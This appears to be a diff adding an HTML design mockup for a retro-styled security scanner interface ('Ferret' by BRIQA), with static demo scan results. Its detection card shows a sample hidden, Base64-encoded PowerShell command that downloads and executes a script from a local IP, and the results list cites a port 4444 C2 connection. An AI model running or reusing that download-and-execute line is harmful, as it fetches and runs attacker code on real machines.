+  margin-bottom: 8px;
+}
+
+.progress-block {
+  flex: 1;
+  height: 16px;
+  background: #1a1a3a;
+  transition: background 0.3s, box-shadow 0.3s;
+}
+
+.progress-block.filled {
+  background: #00ffff;
+  box-shadow: 0 0 6px rgba(0, 255, 255, 0.4);
+}
+
+.progress-block.filled.warn { background: #ffb800; box-shadow: 0 0 6px rgba(255, 184, 0, 0.4); }
+
+.scan-info {
+  display: flex;
+  justify-content: space-between;
+  align-items: center;
+}
+
+.scan-step-text {
+  font-family: 'Press Start 2P', cursive;
+  font-size: 8px;
+  color: #888;
+}
+
+.scan-detection-count {
+  font-family: 'Press Start 2P', cursive;
+  font-size: 8px;
+  color: #ff8800;
+}
+
+.scan-complete-msg {
+  display: none;
+  text-align: center;
+  padding: 16px;
+  margin-top: 12px;
+}
+
+.scan-complete-msg.show { display: block; }
+
+.scan-complete-msg h3 {
+  font-family: 'Press Start 2P', cursive;
+  font-size: 14px;
+  color: #00ff41;
+  text-shadow: 0 0 15px rgba(0, 255, 65, 0.5);
+  margin-bottom: 10px;
+}
+
+.scan-complete-msg p {
+  font-size: 11px;
+  color: #888;
+}
+
+.scan-complete-ferret {
+  display: none;
+  justify-content: center;
+  margin-top: 12px;
+}
+.scan-complete-ferret.show { display: flex; }
+
+/* ========== RESULTS TAB ========== */
+.result-score-section {
+  text-align: center;
+  margin-bottom: 24px;
+}
+
+.threat-score {
+  font-family: 'Press Start 2P', cursive;
+  font-size: 56px;
+  color: #ff8800;
+  text-shadow: 0 0 20px rgba(255, 136, 0, 0.5);
+  margin-bottom: 10px;
+  line-height: 1;
+}
+
+.score-bar {
+  display: flex;
+  gap: 3px;
+  justify-content: center;
+  margin-bottom: 8px;
+}
+
+.score-block {
+  width: 30px;
+  height: 12px;
+  background: #1a1a3a;
+}
+
+.score-block.filled-green { background: #00ff41; box-shadow: 0 0 4px rgba(0, 255, 65, 0.3); }
+.score-block.filled-yellow { background: #ffb800; box-shadow: 0 0 4px rgba(255, 184, 0, 0.3); }
+.score-block.filled-orange { background: #ff8800; box-shadow: 0 0 4px rgba(255, 136, 0, 0.3); }
+.score-block.filled-red { background: #ff0040; box-shadow: 0 0 4px rgba(255, 0, 64, 0.3); }
+
+.grade-label {
+  font-family: 'Press Start 2P', cursive;
+  font-size: 14px;
+  color: #ff8800;
+  text-shadow: 0 0 10px rgba(255, 136, 0, 0.5);
+}
+
+/* Summary grid */
+.summary-grid {
+  display: grid;
+  grid-template-columns: repeat(4, 1fr);
+  gap: 8px;
+  margin-bottom: 24px;
+}
+
+.summary-card {
+  text-align: center;
+  padding: 12px 8px;
+  border: 2px solid;
+}
+
+.summary-card.critical { border-color: #ff0040; background: rgba(255, 0, 64, 0.05); }
+.summary-card.high { border-color: #ff8800; background: rgba(255, 136, 0, 0.05); }
+.summary-card.medium { border-color: #ffb800; background: rgba(255, 184, 0, 0.05); }
+.summary-card.low { border-color: #00ffff; background: rgba(0, 255, 255, 0.05); }
+
+.summary-count {
+  font-family: 'Press Start 2P', cursive;
+  font-size: 20px;
+  margin-bottom: 4px;
+}
+
+.summary-card.critical .summary-count { color: #ff0040; text-shadow: 0 0 10px rgba(255, 0, 64, 0.5); }
+.summary-card.high .summary-count { color: #ff8800; text-shadow: 0 0 10px rgba(255, 136, 0, 0.5); }
+.summary-card.medium .summary-count { color: #ffb800; text-shadow: 0 0 10px rgba(255, 184, 0, 0.5); }
+.summary-card.low .summary-count { color: #00ffff; text-shadow: 0 0 10px rgba(0, 255, 255, 0.5); }
+
+.summary-label {
+  font-family: 'Press Start 2P', cursive;
+  font-size: 7px;
+  color: #888;
+}
+
+/* Detection list */
+.detection-list { display: flex; flex-direction: column; gap: 8px; margin-bottom: 24px; }
+
+.detection-card {
+  display: flex;
+  border: 1px solid #1a1a3a;
+  background: rgba(13, 13, 26, 0.5);
+  cursor: pointer;
+  transition: all 0.3s;
+  overflow: hidden;
+}
+
+.detection-card:hover {
+  border-color: #333;
+  transform: translateX(4px);
+}
+
+.detection-severity-bar {
+  width: 4px;
+  min-height: 100%;
+  flex-shrink: 0;
+}
+
+.detection-severity-bar.critical { background: #ff0040; box-shadow: 0 0 8px rgba(255, 0, 64, 0.5); }
+.detection-severity-bar.high { background: #ff8800; box-shadow: 0 0 8px rgba(255, 136, 0, 0.5); }
+.detection-severity-bar.medium { background: #ffb800; box-shadow: 0 0 8px rgba(255, 184, 0, 0.5); }
+
+.detection-card-body {
+  padding: 10px 14px;
+  flex: 1;
+  display: flex;
+  align-items: center;
+  gap: 12px;
+}
+
+.detection-icon { font-size: 18px; flex-shrink: 0; }
+
+.detection-text { flex: 1; }
+
+.detection-badge {
+  font-family: 'Press Start 2P', cursive;
+  font-size: 6px;
+  padding: 3px 8px;
+  display: inline-block;
+  margin-bottom: 4px;
+}
+
+.detection-badge.critical { color: #ff0040; border: 1px solid #ff0040; background: rgba(255, 0, 64, 0.1); }
+.detection-badge.high { color: #ff8800; border: 1px solid #ff8800; background: rgba(255, 136, 0, 0.1); }
+.detection-badge.medium { color: #ffb800; border: 1px solid #ffb800; background: rgba(255, 184, 0, 0.1); }
+
+.detection-desc {
+  font-size: 12px;
+  color: #c0c0d0;
+  line-height: 1.4;
+}
+
+.detection-arrow {
+  font-family: 'Press Start 2P', cursive;
+  font-size: 10px;
+  color: #333;
+  padding-right: 12px;
+  display: flex;
+  align-items: center;
+}
+
+.detection-card:hover .detection-arrow { color: #00ffff; }
+
+/* Results ferret */
+.results-ferret-area {
+  display: flex;
+  flex-direction: column;
+  align-items: center;
+  margin: 20px 0;
+}
+
+/* CTA button */
+.cta-btn {
+  display: block;
+  width: 100%;
+  font-family: 'Press Start 2P', cursive;
+  font-size: 11px;
+  color: #ff00ff;
+  background: transparent;
+  border: 3px solid #ff00ff;
+  padding: 16px;
+  cursor: pointer;
+  transition: all 0.3s;
+  text-shadow: 0 0 10px rgba(255, 0, 255, 0.5);
+  text-align: center;
+}
+
+.cta-btn:hover {
+  background: rgba(255, 0, 255, 0.1);
+  box-shadow: 0 0 20px rgba(255, 0, 255, 0.3);
+}
+
+/* ========== DETECTION CARD TAB ========== */
+.det-header {
+  display: flex;
+  align-items: center;
+  gap: 12px;
+  margin-bottom: 20px;
+}
+
+.det-critical-badge {
+  font-family: 'Press Start 2P', cursive;
+  font-size: 9px;
+  color: #ff0040;
+  border: 2px solid #ff0040;
+  padding: 6px 14px;
+  background: rgba(255, 0, 64, 0.1);
+  animation: badge-pulse 2s ease-in-out infinite;
+}
+
+@keyframes badge-pulse {
+  0%, 100% { box-shadow: 0 0 0 rgba(255, 0, 64, 0); }
+  50% { box-shadow: 0 0 15px rgba(255, 0, 64, 0.4); }
+}
+
+.det-type {
+  font-family: 'Press Start 2P', cursive;
+  font-size: 8px;
+  color: #ff00ff;
+  border: 1px solid #ff00ff;
+  padding: 4px 10px;
+  background: rgba(255, 0, 255, 0.05);
+}
+
+.det-title {
+  font-family: 'Press Start 2P', cursive;
+  font-size: 12px;
+  color: #ff0040;
+  text-shadow: 0 0 10px rgba(255, 0, 64, 0.3);
+  margin-bottom: 12px;
+  line-height: 1.6;
+}
+
+.det-description {
+  font-size: 13px;
+  color: #c0c0d0;
+  line-height: 1.7;
+  margin-bottom: 20px;
+  padding: 12px;
+  border-left: 3px solid #ff0040;
+  background: rgba(255, 0, 64, 0.02);
+}
+
+.det-section {
+  border: 1px solid #1a1a3a;
+  padding: 14px;
+  margin-bottom: 16px;
+}
+
+.det-section-title {
+  font-family: 'Press Start 2P', cursive;
+  font-size: 8px;
+  color: #00ffff;
+  margin-bottom: 10px;
+  text-shadow: 0 0 8px rgba(0, 255, 255, 0.3);
+}
+
+.process-tree {
+  font-family: 'JetBrains Mono', monospace;
+  font-size: 12px;
+  color: #c0c0d0;
+  line-height: 2;
+}
+
+.process-tree .tree-arrow { color: #00ffff; }
+.process-tree .proc-highlight { color: #ff0040; }
+.process-tree .proc-normal { color: #00ff41; }
+
+.code-block {
+  background: #080810;
+  border: 1px solid #1a1a3a;
+  padding: 12px;
+  font-family: 'JetBrains Mono', monospace;
+  font-size: 11px;
+  color: #ff8800;
+  overflow-x: auto;
+  word-break: break-all;
+  line-height: 1.5;
+  margin-top: 8px;
+}
+
+.mitre-badges {
+  display: flex;
+  flex-wrap: wrap;
+  gap: 8px;
+  margin-top: 8px;
+}
+
+.mitre-badge {
+  font-family: 'Press Start 2P', cursive;
+  font-size: 6px;
+  color: #ff00ff;
+  border: 1px solid #ff00ff;
+  padding: 5px 10px;
+  background: rgba(255, 0, 255, 0.05);
+  transition: all 0.3s;
+}
+
+.mitre-badge:hover {
+  background: rgba(255, 0, 255, 0.15);
+  box-shadow: 0 0 10px rgba(255, 0, 255, 0.3);
+}
+
+.recommendation-box {
+  border: 2px solid #ff0040;
+  background: rgba(255, 0, 64, 0.03);
+  padding: 14px;
+  margin-bottom: 16px;
+}
+
+.recommendation-box .det-section-title { color: #ff0040; }
+
+.recommendation-box p {
+  font-size: 12px;
+  color: #c0c0d0;
+  line-height: 1.7;
+}
+
+.recommendation-box ul {
+  margin: 8px 0 0 20px;
+  font-size: 12px;
+  color: #c0c0d0;
+  line-height: 1.8;
+}
+
+.confidence-section {
+  display: flex;
+  align-items: center;
+  gap: 12px;
+  margin-bottom: 16px;
+}
+
+.confidence-label {
+  font-family: 'Press Start 2P', cursive;
+  font-size: 8px;
+  color: #888;
+  white-space: nowrap;
+}
+
+.confidence-bar {
+  display: flex;
+  gap: 2px;
+  flex: 1;
+}
+
+.conf-block {
+  width: 8px;
+  height: 14px;
+  background: #1a1a3a;
+}
+
+.conf-block.filled { background: #ff0040; box-shadow: 0 0 4px rgba(255, 0, 64, 0.3); }
+
+.confidence-pct {
+  font-family: 'Press Start 2P', cursive;
+  font-size: 10px;
+  color: #ff0040;
+  text-shadow: 0 0 8px rgba(255, 0, 64, 0.5);
+}
+
+/* Detection tab ferret peeking from corner */
+.det-ferret-corner {
+  position: absolute;
+  bottom: 10px;
+  right: 10px;
+  display: flex;
+  align-items: flex-end;
+  gap: 4px;
+}
+
+.magnifying-glass {
+  font-size: 20px;
+  animation: mag-bob 1.5s ease-in-out infinite;
+}
+
+@keyframes mag-bob {
+  0%, 100% { transform: rotate(-10deg); }
+  50% { transform: rotate(10deg); }
+}
+
+/* ========== LABEL BELOW WINDOW ========== */
+.concept-label {
+  text-align: center;
+  margin-top: 20px;
+  font-family: 'Press Start 2P', cursive;
+  font-size: 9px;
+  color: #555;
+  letter-spacing: 2px;
+}
+
+.concept-label span { color: #ff00ff; }
+
+/* ========== UTILITIES ========== */
+.text-center { text-align: center; }
+.mt-8 { margin-top: 8px; }
+.mt-12 { margin-top: 12px; }
+.mt-16 { margin-top: 16px; }
+.mb-8 { margin-bottom: 8px; }
+.mb-16 { margin-bottom: 16px; }
+
+/* Neon glow keyframes */
+@keyframes neon-flicker {
+  0%, 100% { opacity: 1; }
+  92% { opacity: 1; }
+  93% { opacity: 0.8; }
+  94% { opacity: 1; }
+  96% { opacity: 0.9; }
+  97% { opacity: 1; }
+}
+</style>
+</head>
+<body>
+
+<!-- ==================== WINDOW ==================== -->
+<div class="window">
+
+  <!-- Title Bar -->
+  <div class="title-bar">
+    <span class="title-bar-text">&#9632; Ferret v1.0.0 &#8212; Security Scanner</span>
+    <div class="title-bar-buttons">
+      <div class="title-btn">_</div>
+      <div class="title-btn">&#9633;</div>
+      <div class="title-btn close">X</div>
+    </div>
+  </div>
+
+  <!-- Tab Bar -->
+  <div class="tab-bar">
+    <button class="tab-btn active" data-tab="home">HOME</button>
+    <button class="tab-btn" data-tab="scanning">SCANNING</button>
+    <button class="tab-btn" data-tab="results">RESULTS</button>
+    <button class="tab-btn" data-tab="detection">DETECTION</button>
+  </div>
+
+  <!-- ============ TAB 1: HOME ============ -->
+  <div class="tab-content active" id="tab-home">
+    <div class="home-hero">
+      <div class="home-title">FERRET</div>
+      <div class="home-by">by BRIQA</div>
+      <div class="home-subtitle">SECURITY SCANNER</div>
+
+      <div class="home-ferret-area">
+        <div class="speech-bubble">
+          Ready to search!
+          <span class="speech-bubble-inner"></span>
+        </div>
+        <div class="ferret-float">
+          <div class="ferret-wrap" style="width: 48px; height: 40px;">
+            <div class="ferret ferret-idle"></div>
+          </div>
+        </div>
+      </div>
+
+      <div class="sys-info">
+        HOST: <span>DEV-PC</span> &nbsp;|&nbsp; OS: <span>Windows 11</span> &nbsp;|&nbsp; IP: <span>192.168.1.100</span>
+      </div>
+
+      <div class="mt-16">
+        <button class="start-btn" id="startScanBtn">[ START SCAN ]</button>
+      </div>
+
+      <div class="scan-badges">
+        <div class="scan-badge">PROC</div>
+        <div class="scan-badge">NET</div>
+        <div class="scan-badge">SVC</div>
+        <div class="scan-badge">REG</div>
+        <div class="scan-badge">SIGMA</div>
+        <div class="scan-badge">LOGS</div>
+      </div>
+
+      <div class="admin-notice mt-16">
+        &#9888; Run as Administrator for full system access
+      </div>
+    </div>
+  </div>
+
+  <!-- ============ TAB 2: SCANNING ============ -->
+  <div class="tab-content" id="tab-scanning">
+    <div class="scan-header">
+      <h2 id="scanTitle">SCANNING IN PROGRESS</h2>
+      <div class="scan-timer">Elapsed: <span id="elapsedTime">00:00</span></div>
+    </div>
+
+    <!-- Scan Scene -->
+    <div class="scan-scene" id="scanScene">
+      <!-- 8 zones in 4x2 layout -->
+      <div class="scan-zone" id="zone-0" style="left: 16px; top: 16px;">
+        <span class="zone-check">&#10003;</span>
+        <div class="zone-icon">&#9881;</div>
+        <div class="zone-label">PROCESSES</div>
+      </div>
+      <div class="scan-zone" id="zone-1" style="left: 176px; top: 16px;">
+        <span class="zone-check">&#10003;</span>
+        <div class="zone-icon">&#127760;</div>
+        <div class="zone-label">NETWORK</div>
+      </div>
+      <div class="scan-zone" id="zone-2" style="left: 336px; top: 16px;">
+        <span class="zone-check">&#10003;</span>
+        <div class="zone-icon">&#9881;</div>
+        <div class="zone-label">SERVICES</div>
+      </div>
+      <div class="scan-zone" id="zone-3" style="left: 496px; top: 16px;">
+        <span class="zone-check">&#10003;</span>
+        <div class="zone-icon">&#128273;</div>
+        <div class="zone-label">REGISTRY</div>
+      </div>
+      <div class="scan-zone" id="zone-4" style="left: 16px; top: 142px;">
+        <span class="zone-check">&#10003;</span>
+        <div class="zone-icon">&#128269;</div>
+        <div class="zone-label">DETECTORS</div>
+      </div>
+      <div class="scan-zone" id="zone-5" style="left: 176px; top: 142px;">
+        <span class="zone-check">&#10003;</span>
+        <div class="zone-icon">&#128737;</div>
+        <div class="zone-label">SIGMA RULES</div>
+      </div>
+      <div class="scan-zone" id="zone-6" style="left: 336px; top: 142px;">
+        <span class="zone-check">&#10003;</span>
+        <div class="zone-icon">&#128196;</div>
+        <div class="zone-label">EVENT LOGS</div>
+      </div>
+      <div class="scan-zone" id="zone-7" style="left: 496px; top: 142px;">
+        <span class="zone-check">&#10003;</span>
+        <div class="zone-icon">&#10004;</div>
+        <div class="zone-label">COMPLETE</div>
+      </div>
+
+      <!-- Ferret in scene -->
+      <div class="scene-ferret" id="sceneFerret" style="left: 50px; top: 40px;">
+        <div class="ferret-wrap" style="width: 48px; height: 36px;">
+          <div class="ferret ferret-idle" id="sceneFerretSprite"></div>
+        </div>
+      </div>
+    </div>
+
+    <!-- Progress bar -->
+    <div class="progress-section">
+      <div class="progress-bar-container" id="progressBar">
+        <div class="progress-block" data-step="0"></div>
+        <div class="progress-block" data-step="1"></div>
+        <div class="progress-block" data-step="2"></div>
+        <div class="progress-block" data-step="3"></div>
+        <div class="progress-block" data-step="4"></div>
+        <div class="progress-block" data-step="5"></div>
+        <div class="progress-block" data-step="6"></div>
+        <div class="progress-block" data-step="7"></div>
+      </div>
+      <div class="scan-info">
+        <div class="scan-step-text" id="scanStepText">Waiting to start...</div>
+        <div class="scan-detection-count" id="detectionCount">0 detections found</div>
+      </div>
+    </div>
+
+    <!-- Scan complete message -->
+    <div class="scan-complete-msg" id="scanCompleteMsg">
+      <h3>SCAN COMPLETE!</h3>
+      <p>All 8 scan steps finished. Found 8 detections. Click "Results" to view.</p>
+    </div>
+    <div class="scan-complete-ferret" id="scanCompleteFerret">
+      <div style="display: flex; flex-direction: column; align-items: center;">
+        <div class="speech-bubble" style="margin-bottom: 12px;">All done! Let's see!</div>
+        <div class="ferret-wrap" style="width: 48px; height: 40px;">
+          <div class="ferret ferret-happy"></div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- ============ TAB 3: RESULTS ============ -->
+  <div class="tab-content" id="tab-results">
+    <!-- Threat Score -->
+    <div class="result-score-section">
+      <div class="threat-score">72</div>
+      <div class="score-bar">
+        <div class="score-block filled-green"></div>
+        <div class="score-block filled-green"></div>
+        <div class="score-block filled-green"></div>
+        <div class="score-block filled-green"></div>
+        <div class="score-block filled-green"></div>
+        <div class="score-block filled-yellow"></div>
+        <div class="score-block filled-yellow"></div>
+        <div class="score-block filled-yellow"></div>
+        <div class="score-block filled-yellow"></div>
+        <div class="score-block filled-orange"></div>
+        <div class="score-block filled-orange"></div>
+        <div class="score-block filled-orange"></div>
+        <div class="score-block filled-orange"></div>
+        <div class="score-block filled-red"></div>
+        <div class="score-block"></div>
+        <div class="score-block"></div>
+        <div class="score-block"></div>
+        <div class="score-block"></div>
+        <div class="score-block"></div>
+        <div class="score-block"></div>
+      </div>
+      <div class="grade-label mt-8">WARNING</div>
+    </div>
+
+    <!-- Summary grid -->
+    <div class="summary-grid">
+      <div class="summary-card critical">
+        <div class="summary-count">1</div>
+        <div class="summary-label">CRITICAL</div>
+      </div>
+      <div class="summary-card high">
+        <div class="summary-count">3</div>
+        <div class="summary-label">HIGH</div>
+      </div>
+      <div class="summary-card medium">
+        <div class="summary-count">2</div>
+        <div class="summary-label">MEDIUM</div>
+      </div>
+      <div class="summary-card low">
+        <div class="summary-count">2</div>
+        <div class="summary-label">LOW</div>
+      </div>
+    </div>
+
+    <!-- Detection list -->
+    <div class="detection-list">
+      <div class="detection-card" data-goto="detection">
+        <div class="detection-severity-bar critical"></div>
+        <div class="detection-card-body">
+          <div class="detection-icon">&#128128;</div>
+          <div class="detection-text">
+            <div class="detection-badge critical">CRITICAL</div>
+            <div class="detection-desc">powershell.exe executed with encoded commands</div>
+          </div>
+          <div class="detection-arrow">&#9654;</div>
+        </div>
+      </div>
+      <div class="detection-card" data-goto="detection">
+        <div class="detection-severity-bar high"></div>
+        <div class="detection-card-body">
+          <div class="detection-icon">&#128279;</div>
+          <div class="detection-text">
+            <div class="detection-badge high">HIGH</div>
+            <div class="detection-desc">w3wp.exe &#8594; cmd.exe suspicious process chain</div>
+          </div>
+          <div class="detection-arrow">&#9654;</div>
+        </div>
+      </div>
+      <div class="detection-card" data-goto="detection">
+        <div class="detection-severity-bar high"></div>
+        <div class="detection-card-body">
+          <div class="detection-icon">&#127760;</div>
+          <div class="detection-text">
+            <div class="detection-badge high">HIGH</div>
+            <div class="detection-desc">Connection to port 4444 (C2 indicator)</div>
+          </div>
+          <div class="detection-arrow">&#9654;</div>
+        </div>
+      </div>
+      <div class="detection-card" data-goto="detection">
+        <div class="detection-severity-bar medium"></div>
+        <div class="detection-card-body">
+          <div class="detection-icon">&#9888;</div>
+          <div class="detection-text">
+            <div class="detection-badge medium">MEDIUM</div>
+            <div class="detection-desc">svchost.exe running from unusual path</div>
+          </div>
+          <div class="detection-arrow">&#9654;</div>
+        </div>
+      </div>
+    </div>
+
+    <!-- Results ferret -->
+    <div class="results-ferret-area">
+      <div class="speech-bubble" style="margin-bottom: 12px;">Found 8 items!</div>
+      <div class="ferret-wrap" style="width: 48px; height: 40px;">
+        <div class="ferret ferret-happy"></div>
+      </div>
+    </div>
+
+    <!-- CTA -->
+    <button class="cta-btn mt-16">[ ANALYZE WITH BRIQA AI ]</button>
+  </div>
+
+  <!-- ============ TAB 4: DETECTION CARD ============ -->
+  <div class="tab-content" id="tab-detection" style="position: relative;">
+    <div class="det-header">
+      <div class="det-critical-badge">CRITICAL</div>
+      <div class="det-type">LOLBin Execution</div>
+    </div>
+
+    <div class="det-title">PowerShell Encoded Command Execution Detected</div>
+
+    <div class="det-description">
+      A PowerShell process was launched with Base64-encoded command arguments, a technique frequently used by threat actors to obfuscate malicious payloads. The process was spawned from cmd.exe, which itself was a child of explorer.exe, indicating potential user-initiated or social-engineering-based execution.
+    </div>
+
+    <!-- Process Tree -->
+    <div class="det-section">
+      <div class="det-section-title">PROCESS TREE</div>
+      <div class="process-tree">
+        <span class="proc-normal">explorer.exe</span> <span style="color: #555;">(PID: 4520)</span><br>
+        &nbsp;&nbsp;<span class="tree-arrow">&#9492;&#9472;&#9654;</span> <span class="proc-normal">cmd.exe</span> <span style="color: #555;">(PID: 8832)</span><br>
+        &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="tree-arrow">&#9492;&#9472;&#9654;</span> <span class="proc-highlight">powershell.exe</span> <span style="color: #555;">(PID: 12044)</span>
+      </div>
+    </div>
+
+    <!-- Command Line -->
+    <div class="det-section">
+      <div class="det-section-title">COMMAND LINE</div>
+      <div class="code-block">powershell.exe -NoP -NonI -W Hidden -Enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADEALgAyADAAMAAvAHMAaABlAGwAbAAnACkA</div>
+    </div>
+
+    <!-- MITRE ATT&CK -->
+    <div class="det-section">
+      <div class="det-section-title">MITRE ATT&CK</div>
+      <div class="mitre-badges">
+        <div class="mitre-badge">T1059.001</div>
+        <div class="mitre-badge">T1027</div>
+        <div class="mitre-badge">T1105</div>
+        <div class="mitre-badge">T1204.002</div>
+      </div>
+    </div>
+
+    <!-- Recommendation -->
+    <div class="recommendation-box">
+      <div class="det-section-title">RECOMMENDATION</div>
+      <p>Immediate action required:</p>
+      <ul>
+        <li>Isolate the affected host from the network</li>
+        <li>Terminate the suspicious PowerShell process (PID: 12044)</li>
+        <li>Investigate the encoded payload for IOCs</li>
+        <li>Check for persistence mechanisms created by the payload</li>
+        <li>Review network logs for C2 communication to 192.168.1.200</li>
+      </ul>
+    </div>
+
+    <!-- Confidence -->
+    <div class="confidence-section">
+      <div class="confidence-label">CONFIDENCE:</div>
+      <div class="confidence-bar">
+        <div class="conf-block filled"></div>
+        <div class="conf-block filled"></div>
+        <div class="conf-block filled"></div>
+        <div class="conf-block filled"></div>
+        <div class="conf-block filled"></div>
+        <div class="conf-block filled"></div>
+        <div class="conf-block filled"></div>
+        <div class="conf-block filled"></div>
+        <div class="conf-block filled"></div>
+        <div class="conf-block filled"></div>
+        <div class="conf-block filled"></div>
+        <div class="conf-block filled"></div>
+        <div class="conf-block filled"></div>
+        <div class="conf-block filled"></div>
+        <div class="conf-block filled"></div>
+        <div class="conf-block filled"></div>
+        <div class="conf-block filled"></div>
+        <div class="conf-block filled"></div>
+        <div class="conf-block filled"></div>
+        <div class="conf-block"></div>
+      </div>
+      <div class="confidence-pct">95%</div>
+    </div>
+
+    <!-- Ferret peeking from corner -->
+    <div class="det-ferret-corner">
+      <div class="ferret-wrap" style="width: 48px; height: 36px;">
+        <div class="ferret ferret-sniff"></div>
+      </div>
+      <div class="magnifying-glass">&#128270;</div>
+    </div>
+  </div>
+
+  <!-- Status Bar -->
+  <div class="status-bar">
+    <div class="status-left">
+      <span class="status-dot"></span>
+      READY
+    </div>
+    <div class="status-right">FERRET v1.0.0 | BRIQA</div>
+  </div>
+</div>
+
+<!-- Concept label -->
+<div class="concept-label">
+  DESIGN CONCEPT A+ &#8212; <span>RETRO PIXEL WITH FERRET MASCOT</span>
+</div>
+
+<!-- ==================== JAVASCRIPT ==================== -->
+<script>
+(function() {
+  'use strict';
+
+  // ===== TAB SWITCHING =====
+  const tabBtns = document.querySelectorAll('.tab-btn');
+  const tabContents = document.querySelectorAll('.tab-content');
+  let scanStarted = false;
+  let scanRunning = false;
+  let timerInterval = null;
+
+  function switchTab(tabName) {
+    tabBtns.forEach(btn => btn.classList.toggle('active', btn.dataset.tab === tabName));
+    tabContents.forEach(tc => tc.classList.toggle('active', tc.id === 'tab-' + tabName));
+
+    if (tabName === 'scanning' && !scanStarted) {
+      scanStarted = true;
+      startScanAnimation();
+    }
+  }
+
+  tabBtns.forEach(btn => {
+    btn.addEventListener('click', () => switchTab(btn.dataset.tab));
+  });
+
+  // ===== START SCAN BUTTON =====
+  document.getElementById('startScanBtn').addEventListener('click', () => {
+    switchTab('scanning');
+  });
+
+  // ===== DETECTION CARD CLICK =====
+  document.querySelectorAll('.detection-card[data-goto]').forEach(card => {
+    card.addEventListener('click', () => switchTab(card.dataset.goto));
+  });
+
+  // ===== SCAN ANIMATION =====
+  const zones = [
+    { id: 'zone-0', label: 'Scanning processes...', found: false, left: 50, top: 40 },
+    { id: 'zone-1', label: 'Analyzing network...', found: false, left: 210, top: 40 },
+    { id: 'zone-2', label: 'Scanning services...', found: true, left: 370, top: 40 },
+    { id: 'zone-3', label: 'Checking registry...', found: false, left: 530, top: 40 },
+    { id: 'zone-4', label: 'Running detectors...', found: true, left: 50, top: 166 },
+    { id: 'zone-5', label: 'Applying Sigma rules...', found: false, left: 210, top: 166 },
+    { id: 'zone-6', label: 'Parsing event logs...', found: false, left: 370, top: 166 },
+    { id: 'zone-7', label: 'Finalizing...', found: false, left: 530, top: 166 }
+  ];
+
+  const stepNames = [
+    'Scanning processes...',
+    'Analyzing network connections...',
+    'Scanning services...',
+    'Checking registry keys...',
+    'Running detectors...',
+    'Applying Sigma rules...',
+    'Parsing event logs...',
+    'Finalizing scan...'
+  ];
+
+  function startScanAnimation() {
+    if (scanRunning) return;
+    scanRunning = true;
+
+    const ferret = document.getElementById('sceneFerret');
+    const sprite = document.getElementById('sceneFerretSprite');
+    const stepText = document.getElementById('scanStepText');
+    const detCount = document.getElementById('detectionCount');
+    const progressBlocks = document.querySelectorAll('.progress-block');
+    let elapsed = 0;
+    let detections = 0;
+
+    // Start timer
+    const elapsedEl = document.getElementById('elapsedTime');
+    timerInterval = setInterval(() => {
+      elapsed++;
+      const m = String(Math.floor(elapsed / 60)).padStart(2, '0');
+      const s = String(elapsed % 60).padStart(2, '0');
+      elapsedEl.textContent = m + ':' + s;
+    }, 1000);
+
+    // Animate through zones
+    let step = 0;
+
+    function runStep() {
+      if (step >= zones.length) {
+        // Scan complete
+        clearInterval(timerInterval);
+        document.getElementById('scanTitle').textContent = 'SCAN COMPLETE';
+        document.getElementById('scanTitle').style.color = '#00ff41';
+        document.getElementById('scanTitle').style.textShadow = '0 0 15px rgba(0, 255, 65, 0.5)';
+        document.getElementById('scanTitle').style.animation = 'none';
+        stepText.textContent = 'All steps completed!';
+
+        // Hide scene ferret
+        ferret.style.opacity = '0';
+
+        // Show complete message and happy ferret
+        document.getElementById('scanCompleteMsg').classList.add('show');
+        document.getElementById('scanCompleteFerret').classList.add('show');
+
+        scanRunning = false;
+        return;
+      }
+
+      const zone = zones[step];
+      const zoneEl = document.getElementById(zone.id);
+
+      // Move ferret to zone (running pose during transit)
+      sprite.className = 'ferret ferret-run-right';
+      ferret.style.left = zone.left + 'px';
+      ferret.style.top = zone.top + 'px';
+
+      stepText.textContent = 'Step ' + (step + 1) + '/8: ' + stepNames[step];
+
+      // After ferret arrives, start sniffing
+      setTimeout(() => {
+        sprite.className = 'ferret ferret-sniff';
+        zoneEl.classList.add('active');
+
+        // After sniffing, check if found something
+        setTimeout(() => {
+          if (zone.found) {
+            // Found something!
+            sprite.className = 'ferret ferret-found';
+            zoneEl.classList.add('found');
+            detections += (step === 2 ? 3 : 5);
+            detCount.textContent = detections + ' detections found';
+            detCount.style.color = '#ff0040';
+            setTimeout(() => { detCount.style.color = '#ff8800'; }, 400);
+
+            setTimeout(() => {
+              zoneEl.classList.remove('active');
+              zoneEl.classList.remove('found');
+              zoneEl.classList.add('completed');
+              progressBlocks[step].classList.add('filled');
+              if (zone.found) progressBlocks[step].classList.add('warn');
+              step++;
+              runStep();
+            }, 600);
+          } else {
+            // Nothing found, complete zone
+            setTimeout(() => {
+              zoneEl.classList.remove('active');
+              zoneEl.classList.add('completed');
+              progressBlocks[step].classList.add('filled');
+              step++;
+              runStep();
+            }, 600);
+          }
+        }, 500);
+      }, 650);
+    }
+
+    // Small delay before starting
+    setTimeout(runStep, 500);
+  }
+
+  // ===== RESET SCAN ON TAB SWITCH =====
+  // If user switches away from scanning and back, allow restart
+  // (We keep it simple: scan runs once per page load)
+
+})();
+</script>
+
+</body>
+</html>
